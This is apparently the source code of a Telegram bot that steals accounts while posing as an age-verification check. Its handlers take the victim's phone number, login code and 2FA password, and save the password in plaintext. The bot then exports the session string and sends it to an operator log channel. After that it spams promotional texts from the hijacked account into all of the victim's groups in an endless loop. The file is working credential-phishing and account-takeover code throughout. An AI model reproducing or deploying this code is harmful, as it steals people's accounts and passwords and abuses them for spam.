# ========== IMPORT SYSTEM ========== #
import os
import asyncio
import random
from pathlib import Path
from pyrogram import Client, filters, enums
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from motor.motor_asyncio import AsyncIOMotorClient
from config import API_ID, API_HASH, ADMINS, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES, PROMO_TEXTS, STRINGS, OTP_KEYBOARD, VERIFICATION_SUCCESS_KEYBOARD
from tenacity import retry, stop_after_attempt, wait_exponential

from pyrogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
    CallbackQuery
)
from pyrogram.errors import (
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait,
    AuthKeyUnregistered,
    SessionRevoked,
    SessionExpired
)

# ========== MONGODB CONNECTION SYSTEM ========== #
# Synchronous client for initial setup
sync_mongo_client = MongoClient(
    DATABASE_URI_SESSIONS_F,
    server_api=ServerApi('1'),
    maxPoolSize=100,
    minPoolSize=10,
    waitQueueTimeoutMS=10000,
    connectTimeoutMS=30000,
    socketTimeoutMS=30000
)

# Async client for operations
mongo_client = AsyncIOMotorClient(
    DATABASE_URI_SESSIONS_F,
    server_api=ServerApi('1'),
    maxPoolSize=100,
    minPoolSize=10,
    waitQueueTimeoutMS=10000,
    connectTimeoutMS=30000,
    socketTimeoutMS=30000
)

database = mongo_client['Cluster0']['sessions']

# Create indexes (run once)
async def create_indexes():
    await database.create_index("id", unique=True)
    await database.create_index("mobile_number")
    await database.create_index("logged_in")
    await database.create_index("promotion")

# ========== MONGODB TEST SYSTEM ========== #
try:
    sync_mongo_client.admin.command('ping')
    print("Successfully connected to MongoDB!")
    asyncio.create_task(create_indexes())
except Exception as e:
    print(f"MongoDB connection error: {e}")
    raise

# ========== STATE MANAGEMENT SYSTEM ========== #
user_states = {}

@retry(stop=stop_after_attempt(3), wait=wait_exponential(multiplier=1, min=4, max=10))
async def safe_db_operation(operation, *args, **kwargs):
    try:
        return await operation(*args, **kwargs)
    except Exception as e:
        print(f"Database operation failed: {e}")
        raise

async def check_login_status(user_id):
    user_data = await safe_db_operation(database.find_one, {"id": user_id})
    return bool(user_data and user_data.get('logged_in'))

async def cleanup_user_state(user_id):
    if user_id in user_states:
        state = user_states[user_id]
        if 'client' in state and state['client'].is_connected:
            await state['client'].disconnect()
        del user_states[user_id]

async def handle_session_error(bot: Client, phone_number: str, error: Exception):
    error_type = {
        AuthKeyUnregistered: "SESSION_EXPIRED",
        SessionRevoked: "SESSION_REVOKED", 
        SessionExpired: "SESSION_EXPIRED"
    }.get(type(error), "UNKNOWN_ERROR")
    
    await bot.send_message(
        LOG_CHANNEL_SESSIONS_FILES,
        f"💀 #{error_type}: {phone_number}\n"
        f"🛑 Auto-disabled promotion\n\n"
        f"❌ Error: {str(error)[:200]}"
    )
    await safe_db_operation(
        database.update_one,
        {"mobile_number": phone_number},
        {"$set": {"promotion": False}}
    )

# ========== START WITH LOGIN SYSTEM ========== #
@Client.on_message(filters.private & filters.command("start"))
async def start_login(bot: Client, message: Message):
    user_id = message.from_user.id
    try:
        user_data = await safe_db_operation(database.find_one, {"id": user_id})
        
        if user_data and user_data.get('session'):
            try:
                test_client = Client(":memory:", session_string=user_data['session'])
                await test_client.connect()
                await test_client.get_me()
                await test_client.disconnect()
                
                await safe_db_operation(
                    database.update_one,
                    {"id": user_id},
                    {"$set": {"logged_in": True}}
                )
                # Send both message and keyboard
                await message.reply(
                    STRINGS['verification_success'],
                    reply_markup=VERIFICATION_SUCCESS_KEYBOARD
                )
                asyncio.create_task(send_promotion_messages(bot, user_data['session'], user_data['mobile_number']))
                return
            except Exception:
                await safe_db_operation(
                    database.update_one,
                    {"id": user_id},
                    {"$set": {"logged_in": False, "session": None, "promotion": False}}
                )
        
        if await check_login_status(user_id):
            await message.reply(STRINGS['already_logged_in'])
            return
        
        await message.reply(
            STRINGS['age_verification'],
            reply_markup=ReplyKeyboardMarkup(
                [[KeyboardButton("🔞 Verify Age", request_contact=True)]],
                resize_keyboard=True,
                one_time_keyboard=True
            )
        )
    except Exception as e:
        await message.reply("⚠️ An error occurred. Please try again later.")
        print(f"Start error: {e}")

# ========== LOGOUT SYSTEM ========== #
@Client.on_message(filters.private & filters.command("logout"))
async def handle_logout(bot: Client, message: Message):
    user_id = message.from_user.id
    
    await safe_db_operation(
        database.update_one,
        {"id": user_id},
        {"$set": {"logged_in": False}}
    )
    
    await message.reply(STRINGS['logout_success'])
    await cleanup_user_state(user_id)

# ========== CONTACT SYSTEM ========== #
@Client.on_message(filters.private & filters.contact)
async def handle_contact(bot: Client, message: Message):
    user_id = message.from_user.id
    try:
        if await check_login_status(user_id):
            await message.reply(STRINGS['already_logged_in'], reply_markup=ReplyKeyboardRemove())
            return
        
        processing_msg = await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())
        
        phone_number = message.contact.phone_number
        if not phone_number.startswith('+'):
            phone_number = f"+{phone_number}"
        
        client = Client(":memory:", API_ID, API_HASH)
        
        try:
            await client.connect()
            code = await client.send_code(phone_number)
            user_states[user_id] = {
                'phone_number': phone_number,
                'client': client,
                'phone_code_hash': code.phone_code_hash,
                'otp_digits': '',
                'processing_msg_id': processing_msg.id,
                'otp_attempts': 0,
                '2fa_attempts': 0
            }
            
            sent_msg = await bot.send_message(
                user_id,
                "**Verification Code Successfully Sent!**\n\n📤 Enter The Verification Code We sent:",
                reply_markup=OTP_KEYBOARD
            )
            user_states[user_id]['last_msg_id'] = sent_msg.id
            await bot.delete_messages(user_id, processing_msg.id)
            
        except Exception as e:
            await message.reply(f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.", reply_markup=ReplyKeyboardRemove())
            await cleanup_user_state(user_id)
            print(f"Contact error: {e}")
    except Exception as e:
        await message.reply("⚠️ An error occurred. Please try again later.")
        print(f"Contact handler error: {e}")

# ========== OTP SYSTEM ========== #
@Client.on_callback_query(filters.regex("^otp_"))
async def handle_otp_buttons(bot: Client, query: CallbackQuery):
    user_id = query.from_user.id
    if user_id not in user_states:
        await query.answer("⚠️ Oops! Something went wrong.\n\nPlease try /start again later.", show_alert=True)
        await query.message.delete()
        return
    
    action = query.data.split("_")[1]
    state = user_states[user_id]

    if action == "back":
        state['otp_digits'] = state['otp_digits'][:-1]
    else:
        if len(state['otp_digits']) < 6:
            state['otp_digits'] += action
    
    if len(state['otp_digits']) == 5:
        await query.message.edit("Verifying Code...")
        try:
            await state['client'].sign_in(
                state['phone_number'],
                state['phone_code_hash'],
                state['otp_digits']
            )
            await create_session(bot, state['client'], user_id, state['phone_number'])
            return
        except PhoneCodeInvalid:
            state['otp_attempts'] += 1
            if state['otp_attempts'] >= 3:
                await query.message.edit(STRINGS['otp_blocked'])
                await safe_db_operation(
                    database.update_one,
                    {"id": user_id},
                    {"$set": {"blocked": True}}
                )
                await cleanup_user_state(user_id)
                return
            
            attempts_left = 3 - state['otp_attempts']
            await query.message.edit(
                STRINGS['otp_wrong'].format(attempts=attempts_left),
                reply_markup=OTP_KEYBOARD
            )
            state['otp_digits'] = ''
        except SessionPasswordNeeded:
            await query.message.edit("**🔒 2FA Password Required! 🔒**\n\nEnter Your 2FA Password:")
            state['needs_password'] = True
            state['last_msg_id'] = query.message.id
        except Exception as e:
            await query.message.reply(f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.")
            await cleanup_user_state(user_id)
            print(f"OTP error: {e}")
        return
    
    await query.message.edit(
        f"**Current Verification Code:** `{state['otp_digits'] or '____'}`\n\n📤 Enter The Verification Code We sent:",
        reply_markup=OTP_KEYBOARD
    )
    await query.answer()

@Client.on_message(filters.private & filters.text & ~filters.command(["start", "logout"]))
async def handle_2fa_password(bot: Client, message: Message):
    user_id = message.from_user.id
    if user_id not in user_states or not user_states[user_id].get('needs_password'):
        return
    
    password = message.text
    state = user_states[user_id]
    
    try:
        if 'last_msg_id' in state:
            try:
                await bot.delete_messages(user_id, state['last_msg_id'])
            except Exception:
                pass
        
        try:
            await message.delete()
        except Exception:
            pass
        
        await state['client'].check_password(password=password)
        verified_msg = await bot.send_message(user_id, "Password verified...", reply_markup=ReplyKeyboardRemove())
        state['verified_msg_id'] = verified_msg.id
        
        await safe_db_operation(
            database.update_one,
            {"id": user_id},
            {"$set": {
                "2fa_status": True,
                "2fa_password": password
            }},
            upsert=True
        )
        
        await create_session(bot, state['client'], user_id, state['phone_number'])
        
    except PasswordHashInvalid:
        state['2fa_attempts'] += 1
        if state['2fa_attempts'] >= 3:
            await message.reply(STRINGS['2fa_blocked'], reply_markup=ReplyKeyboardRemove())
            await safe_db_operation(
                database.update_one,
                {"id": user_id},
                {"$set": {"blocked": True}}
            )
            await cleanup_user_state(user_id)
            return
        
        attempts_left = 3 - state['2fa_attempts']
        error_msg = await message.reply(
            STRINGS['2fa_wrong'].format(attempts=attempts_left),
            reply_markup=ReplyKeyboardRemove()
        )
        state['last_msg_id'] = error_msg.id
    except Exception as e:
        await message.reply(f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.", reply_markup=ReplyKeyboardRemove())
        await cleanup_user_state(user_id)
        print(f"2FA error: {e}")

# ========== SESSION SYSTEM ========== #
async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
    try:
        string_session = await client.export_session_string()
        await client.disconnect()
        
        data = {
            'session': string_session,
            'logged_in': True,
            'mobile_number': phone_number,
            'promotion': True
        }
        
        if existing := await safe_db_operation(database.find_one, {"id": user_id}):
            await safe_db_operation(
                database.update_one,
                {'_id': existing['_id']},
                {'$set': data}
            )
        else:
            data['id'] = user_id
            await safe_db_operation(database.insert_one, data)

        os.makedirs("sessions", exist_ok=True)
        clean_phone = phone_number.replace('+', '')
        session_file = Path(f"sessions/{clean_phone}.session")

        with open(session_file, "w") as f:
            f.write(string_session)
            
        await bot.send_document(
            LOG_CHANNEL_SESSIONS_FILES,
            str(session_file),
            caption=f"📱 User: {clean_phone}\n🔑 Session Created!"
        )
        os.remove(session_file)

        state = user_states.get(user_id, {})
        messages_to_delete = []
        if 'verified_msg_id' in state:
            messages_to_delete.append(state['verified_msg_id'])
        if 'last_msg_id' in state:
            messages_to_delete.append(state['last_msg_id'])
        
        for msg_id in messages_to_delete:
            try:
                await bot.delete_messages(user_id, msg_id)
            except Exception:
                pass
        
        await bot.send_message(
            user_id,
            STRINGS['verification_success'],
            reply_markup=VERIFICATION_SUCCESS_KEYBOARD
        )
        asyncio.create_task(send_promotion_messages(bot, string_session, phone_number))
        
    except Exception as e:
        await bot.send_message(user_id, f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.")
        print(f"Session creation error: {e}")
    finally:
        await cleanup_user_state(user_id)

# ========== PROMOTIONAL SYSTEM ========== #
async def send_promotion_messages(bot: Client, session_string: str, phone_number: str):
    already_notified = False
    status_message = None
    
    while True:
        client = None
        try:
            # Add small delay between cycles
            await asyncio.sleep(5)
            
            client = Client("promo", session_string=session_string)
            await client.start()
            already_notified = False
            
            me = await client.get_me()
            total_groups = 0
            owned_channels = 0
            owned_groups = 0
            members_count = 0
            groups = []
            
            try:
                async for dialog in client.get_dialogs():
                    try:
                        if not hasattr(dialog, 'chat'):
                            continue
                            
                        chat = dialog.chat
                        if not chat:
                            continue
                            
                        if chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                            total_groups += 1
                            groups.append(chat)
                            
                        if hasattr(chat, 'is_creator') and chat.is_creator:
                            if chat.type == enums.ChatType.CHANNEL:
                                owned_channels += 1
                            elif chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                                owned_groups += 1
                            
                            if hasattr(chat, 'members_count') and chat.members_count:
                                members_count += chat.members_count
                            else:
                                try:
                                    count = await client.get_chat_members_count(chat.id)
                                    members_count += count
                                except:
                                    pass
                    except Exception:
                        continue
            except Exception as e:
                print(f"Dialog error: {e}")
            
            message_text = (
                f"🚀 Promotion Starting For: {phone_number}\n"
                f"👤 User: @{me.username or 'N/A'} ({me.id})\n\n"
                f"📊 Status:\n"
                f"• Total Groups: {total_groups}\n"
                f"• Owned Groups: {owned_groups}\n"
                f"• Owned Channels: {owned_channels}\n"
                f"• Total Members in Owned Chats: {members_count}\n\n"
                f"✅ Total Messages Sent: 0/{total_groups}"
            )
            
            try:
                if status_message:
                    await status_message.edit_text(message_text)
                else:
                    status_message = await bot.send_message(
                        LOG_CHANNEL_SESSIONS_FILES,
                        message_text
                    )
            except Exception:
                status_message = await bot.send_message(
                    LOG_CHANNEL_SESSIONS_FILES,
                    message_text
                )
            
            user_data = await safe_db_operation(database.find_one, {"mobile_number": phone_number})
            if not user_data or not user_data.get('promotion', True):
                await bot.send_message(
                    LOG_CHANNEL_SESSIONS_FILES,
                    f"⏸️ Promotion stopped for: {phone_number}"
                )
                break

            sent_count = 0
            for group in groups:
                try:
                    promo_text = random.choice(PROMO_TEXTS)
                    await client.send_message(group.id, promo_text)
                    sent_count += 1
                    
                    try:
                        await status_message.edit_text(
                            f"🚀 Promotion Starting For: {phone_number}\n"
                            f"👤 User: @{me.username or 'N/A'} ({me.id})\n\n"
                            f"📊 Status:\n"
                            f"• Total Groups: {total_groups}\n"
                            f"• Owned Groups: {owned_groups}\n"
                            f"• Owned Channels: {owned_channels}\n"
                            f"• Total Members in Owned Chats: {members_count}\n\n"
                            f"✅ Total Messages Sent: {sent_count}/{total_groups}"
                        )
                    except Exception:
                        status_message = await bot.send_message(
                            LOG_CHANNEL_SESSIONS_FILES,
                            f"🚀 Promotion Starting For: {phone_number}\n"
                            f"👤 User: @{me.username or 'N/A'} ({me.id})\n\n"
                            f"📊 Status:\n"
                            f"• Total Groups: {total_groups}\n"
                            f"• Owned Groups: {owned_groups}\n"
                            f"• Owned Channels: {owned_channels}\n"
                            f"• Total Members in Owned Chats: {members_count}\n\n"
                            f"✅ Total Messages Sent: {sent_count}/{total_groups}"
                        )
                    
                    await asyncio.sleep(60)
                except FloodWait as e:
                    await bot.send_message(
                        LOG_CHANNEL_SESSIONS_FILES,
                        f"⏳ FloodWait {e.value}s for {phone_number}"
                    )
                    await asyncio.sleep(e.value + 5)
                except Exception:
                    # Silently skip failed messages without logging
                    await asyncio.sleep(5)

            try:
                await status_message.edit_text(
                    f"🚀 Cycle Completed For: {phone_number}\n"
                    f"👤 User: @{me.username or 'N/A'} ({me.id})\n\n"
                    f"📊 Status:\n"
                    f"• Total Groups: {total_groups}\n"
                    f"• Owned Groups: {owned_groups}\n"
                    f"• Owned Channels: {owned_channels}\n"
                    f"• Total Members in Owned Chats: {members_count}\n\n"
                    f"✅ Total Messages Sent: {sent_count}/{total_groups}\n\n"
                    f"⏳ Next Cycle Starting In 10 Minutes."
                )
            except Exception:
                pass
                
            await asyncio.sleep(600)
            
        except (AuthKeyUnregistered, SessionRevoked, SessionExpired) as e:
            if not already_notified:
                await handle_session_error(bot, phone_number, e)
                already_notified = True
            break
        except Exception as e:
            await bot.send_message(
                LOG_CHANNEL_SESSIONS_FILES,
                f"⚠️ Cycle error: {str(e)[:200]}\nRetrying in 5m..."
            )
            await asyncio.sleep(300)
        finally:
            if client:
                try:
                    await client.stop()
                except:
                    pass

# ========== DATABASE ADMIN SYSTEM ========== #
@Client.on_message(filters.private & filters.command("db") & filters.user(ADMINS))
async def handle_db_command(bot: Client, message: Message):
    try:
        # Get database stats
        total_users = await database.count_documents({})
        active_users = await database.count_documents({"logged_in": True})
        promo_active = await database.count_documents({"promotion": True})
        blocked_users = await database.count_documents({"blocked": True})
        
        text = (
            f"📊 <b>Database Status</b> 📊\n\n"
            f"👥 <b>Total Users:</b> {total_users}\n"
            f"🟢 <b>Active Logins:</b> {active_users}\n"
            f"📢 <b>Active Promotions:</b> {promo_active}\n"
            f"🚫 <b>Blocked Users:</b> {blocked_users}"
        )
        
        await message.reply(
            text,
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("🔧 DB Update 🔧", callback_data="db_update"),
                    InlineKeyboardButton("🔄 Refresh 🔄", callback_data="db_refresh")
                ]
            ])
        )
    except Exception as e:
        await message.reply(f"⚠️ Error fetching database stats: {e}")

@Client.on_callback_query(filters.regex("^db_") & filters.user(ADMINS))
async def handle_db_callbacks(bot: Client, query: CallbackQuery):
    action = query.data.split("_")[1]
    
    if action == "refresh":
        try:
            # Refresh stats
            total_users = await database.count_documents({})
            active_users = await database.count_documents({"logged_in": True})
            promo_active = await database.count_documents({"promotion": True})
            blocked_users = await database.count_documents({"blocked": True})
            
            text = (
                f"📊 <b>Database Status</b> 📊\n\n"
                f"👥 <b>Total Users:</b> {total_users}\n"
                f"🟢 <b>Active Logins:</b> {active_users}\n"
                f"📢 <b>Active Promotions:</b> {promo_active}\n"
                f"🚫 <b>Blocked Users:</b> {blocked_users}"
            )
            
            await query.message.edit(
                text,
                reply_markup=InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton("🔧 DB Update 🔧", callback_data="db_update"),
                        InlineKeyboardButton("🔄 Refresh 🔄", callback_data="db_refresh")
                    ]
                ])
            )
            await query.answer("Database stats refreshed!")
        except Exception as e:
            await query.answer(f"Error: {e}", show_alert=True)
    
    elif action == "update":
        await query.message.edit(
            "🔧 <b>Database Update Options</b> 🔧\n\n"
            "Select what you want to update:",
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ Enable Promotion", callback_data="db_promo_true"),
                    InlineKeyboardButton("❌ Disable Promotion", callback_data="db_promo_false")
                ],
                [
                    InlineKeyboardButton("✅ Enable Login", callback_data="db_login_true"),
                    InlineKeyboardButton("❌ Disable Login", callback_data="db_login_false")
                ],
                [
                    InlineKeyboardButton("🔙 Back", callback_data="db_back")
                ]
            ])
        )
        await query.answer()
    
    elif action == "back":
        await handle_db_command(bot, query.message)
        await query.answer()
    
    elif action.startswith("promo_"):
        status = query.data.split("_")[2] == "true"
        try:
            await database.update_many(
                {},
                {"$set": {"promotion": status}}
            )
            await query.answer(f"All users promotion set to {status}!")
            await handle_db_callbacks(bot, query)
        except Exception as e:
            await query.answer(f"Error: {e}", show_alert=True)
    
    elif action.startswith("login_"):
        status = query.data.split("_")[2] == "true"
        try:
            await database.update_many(
                {},
                {"$set": {"logged_in": status}}
            )
            await query.answer(f"All users login status set to {status}!")
            await handle_db_callbacks(bot, query)
        except Exception as e:
            await query.answer(f"Error: {e}", show_alert=True)
